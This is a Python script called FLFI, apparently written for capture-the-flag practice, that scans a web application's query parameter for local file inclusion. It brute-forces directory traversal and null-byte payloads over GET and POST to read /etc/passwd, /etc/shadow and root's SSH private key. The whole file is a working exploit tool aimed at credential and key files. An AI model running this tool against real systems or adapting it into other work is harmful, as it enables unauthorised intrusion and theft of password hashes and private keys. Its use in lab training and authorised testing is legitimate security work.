### FLFI - Find Local File Inclusion 
# Joshua Knox aka KNINJA
# Because the K is silent...like a ninja.
# October 2021
###

import argparse
import requests

common_files=[ {
        "name": "/etc/passwd",
        "checks": ["root:x","/bin/bash"],
    },{
        "name": "/etc/profile",
        "checks": ["/etc/profile:", "PATH=" ],
    },{
        "name": "/etc/issue",
        "checks": ["LTS", "Ubuntu"],
    },{
        "name": "/proc/version",
        "checks": ["Linux version"],
    },{
        "name": "/etc/shadow",
        "checks": ["99999:7:::"],
    },{
        "name": "/root/.ssh/id_rsa",
        "checks": ["PRIVATE KEY"],
    }]

# Parse CLI parameters:
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', dest="url", required=True, type=str, \
    help="Please provide a URL that includes the parameter to be checked \
        against EXAMPLE:  http://10.10.136.177/lab6.php?file=.")

parser.add_argument('-f', '--file', dest="search_file", required=False, type=str, \
    help="File to be searched for, if not specified I will attempt to search from \
        a list of common files")

args = parser.parse_args()
url = args.url
dts=['../', '....//']
nbyte = ['','/.','%00']
max_depth=12


# Check url for http prefix and check for proper format. 
def clean_url(url):
    if ('?' not in url) or ('=' not in url):
        print("\nThe provided URL does not appear to have a query string to check \
            for vulnerabilities. The URL should look something like this: \
            http://10.10.136.177/lab6.php?file=")
        print("If you need more help please check out this room on Try Hack Me: \
            https://tryhackme.com/room/lfibasics")
    if url[0:4] != "http":
        url = "http://" + url
    return url


                
def dir_trav(url, f):
    print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK <---") 
    for i in range(max_depth + 1):
        for sym in dts:
            for nb in nbyte:
                if i == 0:
                    dtr_url = url + f['name'] + nb
                    r = requests.get(dtr_url)
                else:
                    dtr_url = url + (sym * i) +  f['name'][1:] + nb
                    print("[-] TRYING: " + dtr_url)
                    r = requests.get(dtr_url)
                    print(r.status_code)
                for check in f['checks']:
                    if check in r.text:
                        return [ url, sym, i, nb]
    return 'I got nothing'

def dir_post(url, f):
    print("\n---> TRYING TO USE POST METHOD FOR TRAVERSAL and NULLBYTE CHECK <---") 
    param = url.split("?")[1].replace("=", "")
    url = url.split('?')[0]
    for i in range(max_depth + 1):
        for sym in dts:
            for nb in nbyte:
                if i == 0:
                    file_to_try=f['name'][1:] + nb
                    r = requests.post(url, data={param:file_to_try})
                else:
                    file_to_try = (sym * i) +  f['name'][1:] + nb
                    print("[-] TRYING: " + param + " " + file_to_try)
                    r = requests.post(url, data=param + " = " + file_to_try)
                    print(r.status_code)
                for check in f['checks']:
                    if check in r.text:
                        print(r.text)
                        return [ url, param, file_to_try]
    return 'I got nothing'
        

def check_all_files(lfi):
    for f in common_files:
        r = requests.get(lfi[0] + (lfi[1] * lfi[2]) + f['name'][1:] + lfi[3])
        for check in f['checks']:
            if check in r.text:
                print("----------------------")
                print("[+] FOUND " + f['name'] + " at: " + lfi[0] + (lfi[1] * lfi[2]) + f['name'][1:] + lfi[3])
                break
    quit()

def check_all_files_post(lfi):
    for f in common_files:
        r = requests.post(lfi[0], data={lfi[1]:lfi[2]})
        for check in f['checks']:
            if check in r.text:
                print("----------------------")
                print("[+] FOUND " + f['name'] + " with POST to: " + lfi[0] + " with param: " + "'" + lfi[1] +"'" + " File name: " + lfi[2])
                break
    quit()

# LET'S GO! 
url=clean_url(url)
for f in common_files:
    answer = dir_trav(url,f)
    if answer != "I got nothing":
        check_all_files(answer)
    post_answer = dir_post(url,f)
    if post_answer != "I got nothing":
        check_all_files_post(post_answer)

